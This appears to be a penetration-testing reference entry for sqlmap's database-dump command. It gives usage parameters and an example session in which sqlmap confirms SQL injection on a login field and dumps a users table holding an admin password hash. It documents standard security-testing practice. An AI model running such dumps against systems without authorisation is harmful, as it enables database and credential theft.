---
id: 3281f239-fa6d-4285-a224-21f67fba90a8
type: command
executor: bash
data: sqlmap -r $_REQUEST_FILE --dump
output: >-
  root@kali:~# sqlmap -r web-request.txt --dump
          ___
         __H__
   ___ ___[']_____ ___ ___  {1.3.4#stable}
  |_ -| . [']     | .'| . |

  |___|_  [,]_|_|_|__,|  _|
        |_|V...       |_|   http://sqlmap.org

  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior
  mutual consent is illegal. It is the end user's responsibility to obey all
  applicable local, state and federal laws. Developers assume no liability and
  are not responsible for any misuse or damage caused by this program


  [*] starting @ 16:38:45 /2019-10-22/


  [16:38:45] [INFO] parsing HTTP request from 'web-request.txt'

  [16:38:45] [INFO] testing connection to the target URL

  [16:38:46] [INFO] heuristics detected web page charset 'ISO-8859-2'

  [16:38:46] [INFO] testing if the target URL content is stable

  [16:38:47] [INFO] testing if POST parameter 'username' is dynamic

  [16:38:47] [INFO] heuristic (basic) test shows that POST parameter 'username'
  might be injectable

  [16:38:48] [INFO] testing for SQL injection on POST parameter 'username'

  [16:38:48] [INFO] testing 'MySQL >= 5.0 AND error-based'

  [16:38:49] [INFO] POST parameter 'username' is 'MySQL >= 5.0 AND error-based'
  injectable

  [16:38:49] [INFO] fetching database names

  available databases [3]:

  [*] information_schema

  [*] mysql

  [*] webapp_db

  [16:38:50] [INFO] fetching tables for database: 'webapp_db'

  Database: webapp_db

  [2 tables]

  +------------+

  | users      |

  | products   |

  +------------+

  [16:38:51] [INFO] fetching columns for table 'users' in database 'webapp_db'

  Database: webapp_db

  Table: users

  [4 columns]

  +----------+--------------+------+-----+

  | id       | username     | pass | email |

  +----------+--------------+------+-----+

  [16:38:52] [INFO] retrieved: 1 for id

  [16:38:52] [INFO] retrieved: admin for username

  [16:38:52] [INFO] retrieved: 5f4dcc3b5aa765d61d8327deb882cf99 for pass

  [16:38:52] [INFO] retrieved: admin@example.com for email

  dumped data into 'webapp_db/users.csv'
created_at: '2019-10-22T21:41:56.775529+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - SQLi
  - exploitation
verified: true
validated: true
---

# sqlmap-dump-database-from-request-file

## Command

```bash
sqlmap -r $_REQUEST_FILE --dump
```

## Description

This command uses sqlmap to parse an HTTP request file (typically captured from tools like Burp Suite), test for SQL injection vulnerabilities in the request parameters, and automatically dump the contents of the database if an injectable point is identified. It is ideal for exploiting confirmed SQL injection flaws in web applications during penetration testing, allowing enumeration and extraction of sensitive data such as user credentials or configuration details.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -r $_REQUEST_FILE | Path to the HTTP request file in Burp Suite or raw format, containing the method, URL, headers, and body with vulnerable parameters | Yes |
| --dump | Flag to automatically start dumping DBMS database table entries and files once an injection point is confirmed | Yes |
| -v $_LEVEL (optional) | Verbosity level (0-6) to control the detail of output during testing and exploitation | No |
| --dbms=$_DBMS (optional) | Specify the target database management system (e.g., mysql, postgresql, mssql) to optimize tests and payloads | No |
| --batch | Run in non-interactive mode, automatically accepting default options to speed up execution | No |
| --threads=$_THREADS (optional) | Number of concurrent HTTP requests to use for faster enumeration (default: 1) | No |

## Examples

### Basic Usage

```bash
sqlmap -r web-request.txt --dump
```

### Advanced Usage

```bash
sqlmap -r web-request.txt --dump -v 3 --dbms=mysql --batch --threads=5
```

## Expected Output

The command begins with sqlmap's ASCII banner and legal disclaimer, followed by parsing of the input request file. It then tests the connection to the target, detects the page charset, and checks for dynamic parameters. If a vulnerability is found (e.g., error-based injection on a POST parameter), it enumerates databases, tables, and columns, then dumps the data. Success is shown through 'injectable' confirmations, lists of databases/tables/columns, and sample retrieved data. Dumped content is saved to CSV files in the current directory, named like 'database_name/table_name.csv'.

## Related

- [[tools/sqlmap]]
- [[procedures/Exploit-Web-App-SQL-Injection-with-SQLMap]]
